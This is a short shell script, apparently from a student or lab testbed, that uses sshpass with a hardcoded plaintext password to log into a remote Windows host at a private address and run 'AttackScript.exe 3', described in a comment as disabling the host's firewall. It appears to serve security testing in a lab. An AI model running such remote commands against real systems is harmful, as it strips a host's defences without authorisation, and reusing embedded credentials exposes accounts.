#!/bin/sh

# Description: This file/script demostrates the disabling of Firewall on the remote Windows Host System
# Tag: Disable Firewall   
# sshpass -p 'Student12345@' ssh student@172.16.2.223 "C:\Users\Student\Desktop\SharedFolder\Compiled-Script\AttackScript.exe 3"
sshpass -p 'Student12345@' ssh student@172.16.2.223 -o ConnectTimeout=5 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 3"
